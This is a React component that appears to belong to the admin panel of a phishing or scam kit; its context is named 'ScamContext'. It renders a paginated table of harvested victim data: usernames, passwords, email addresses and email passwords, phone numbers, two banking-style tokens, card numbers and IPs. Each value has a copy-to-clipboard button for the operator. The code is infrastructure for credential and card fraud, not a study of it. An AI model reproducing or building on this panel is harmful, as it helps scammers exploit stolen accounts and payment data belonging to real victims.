import { Pagination, Tooltip } from '@nextui-org/react'
import { useContext, useState } from 'react'
import { DeleteIcon } from '../../assets/DeleteIcon'
import { IconButton } from '../../assets/IconButton'
import { ScamContext } from '../../context/ScamContext'
import tableHeader from '../../options.json'

export const TableUserAll = ({users}) => {

  const { deleteUser, filteredType } = useContext(ScamContext);

  const [currentPage, setCurrentPage] = useState(0);

  const filteredUsers = () => {
    return users.slice( currentPage === 0 ? 0 : currentPage - 10, currentPage === 0 ? currentPage + 10 : currentPage)
  }

  const pagination = (e) => {

    const newData = e === 1 ? 0 : e * 10;
    
    setCurrentPage( newData  )
  }
  
  return (
    <>
      <div className="overflow-x-auto">
          <table className="table-auto w-full">
              <thead className="text-xs font-semibold uppercase text-gray-400 bg-gray-50">
                  <tr>
                    {
                      tableHeader.tableHeaderOptions.map( e => { 
                        if(filteredType.includes(e) ) return ( 
                          <th key={e} className="p-2 py-3 whitespace-nowrap">
                            <div className='font-semibold text-left'>
                              {e}
                            </div>
                          </th> 
                        );

                        if(e == 'usuario' || e == "clave" || e == "Ip" || e == "..." || filteredType.length === 1  ) return (
                          <th key={e} className="p-2 py-3 whitespace-nowrap">
                            <div className='font-semibold text-left'>
                              {e}
                            </div>
                          </th> 
                        );
                      })
                    }
                  </tr>
              </thead>
              <tbody className="text-sm divide-y divide-gray-100">
                {
                  filteredUsers().map( ({_id, username, password, correo, claveCorreo, celular, token1, token2, tarjeta, ip }, i) => {
                    return (
                      <tr key={i}>
                        <td className='p-2 py-3 whitespace-nowrap'>
                          <div className="flex items-center">
                            <Tooltip
                                content={'Copiado!'}
                                trigger={'click'}
                                color={"primary"}
                              >
                              <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(username)}>{username}</button>
                            </Tooltip>
                          </div>
                        </td>
                        <td className='p-2 py-3 whitespace-nowrap'>
                          <div className="flex items-center">
                            <Tooltip
                                content={'Copiado!'}
                                trigger={'click'}
                                color={"primary"}
                              >
                              <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(password)}>{password}</button>
                            </Tooltip>
                          </div>
                        </td>
                        {/* Filtro de correo */}
                        {
                          (filteredType.includes('Correo') || filteredType.length === 1) && (
                            <td className='p-2 py-3 whitespace-nowrap' >
                              <div className="flex items-center">
                              <Tooltip
                                content={'Copiado!'}
                                trigger={'click'}
                                color={"primary"}
                              >
                                <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(correo)}>{correo}</button>
                              </Tooltip>
                              </div>
                            </td>
                          )
                        }
                        {
                          (filteredType.includes('Clave del correo') || filteredType.length === 1) && (
                            <td className='p-2 py-3 whitespace-nowrap'>
                              <div className="flex items-center">
                                <Tooltip
                                  content={'Copiado!'}
                                  trigger={'click'}
                                  color={"primary"}
                                >
                                  <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(claveCorreo)}>{claveCorreo}</button>
                                </Tooltip>
                              </div>
                            </td>
                          )
                        }
                        {
                          (filteredType.includes('Celular') || filteredType.length === 1) && (
                            <td className='p-2 py-3 whitespace-nowrap'>
                              <div className="flex items-center">
                                <Tooltip
                                    content={'Copiado!'}
                                    trigger={'click'}
                                    color={"primary"}
                                  >
                                  <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(celular)}>{celular}</button>
                                </Tooltip>
                              </div>
                            </td>
                          )
                        }
                        {
                          (filteredType.includes('Token1') || filteredType.length === 1) && (
                            <td className='p-2 py-3 whitespace-nowrap'>
                              <div className="flex items-center">
                                <Tooltip
                                    content={'Copiado!'}
                                    trigger={'click'}
                                    color={"primary"}
                                  >
                                  <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(token1)}>{token1}</button>
                                </Tooltip>
                              </div>
                            </td>
                          )
                        }
                        {
                          (filteredType.includes('Token2') || filteredType.length === 1) && (
                            <td className='p-2 py-3 whitespace-nowrap'>
                              <div className="flex items-center">
                                <Tooltip
                                    content={'Copiado!'}
                                    trigger={'click'}
                                    color={"primary"}
                                  >
                                  <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(token2)}>{token2}</button>
                                </Tooltip>
                              </div>
                            </td>
                          )
                        }
                        {
                          (filteredType.includes('Tarjeta') || filteredType.length === 1) && (
                            <td className='p-2 py-3 whitespace-nowrap'>
                              <div className="flex items-center">
                                <Tooltip
                                    content={'Copiado!'}
                                    trigger={'click'}
                                    color={"primary"}
                                  >
                                  <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(tarjeta)}>{tarjeta}</button>
                                </Tooltip>
                              </div>
                            </td>
                          )
                        }
                        <td className='p-2 py-3 whitespace-nowrap'>
                          <div className="flex items-center">
                            <div className="text-gray-800">{ip}</div>
                          </div>
                        </td>

                        <td className='p-2 py-3 whitespace-nowrap'>
                          <div className="flex items-center">
                            <IconButton onClick={() => deleteUser({_id})}>
                              <DeleteIcon size={18} fill="#FF0080" />
                            </IconButton>
                          </div>
                        </td>
                      </tr>
                    )
                  })
                }
              </tbody>
          </table>
      </div>
      <div className='mt-10'>
        <Pagination 
          total={          
            users.length >= 10 ? 
            Number.isInteger(users.length / 10) === false 
            ? Math.round(users.length / 10 + 1)
            : Math.round(users.length / 10 )
            : 1
          }
          loop
          noMargin
          shadow
          initialPage={1}
          onChange={(e) => pagination(e) }
          
          />
      </div>
    </>
  );
}
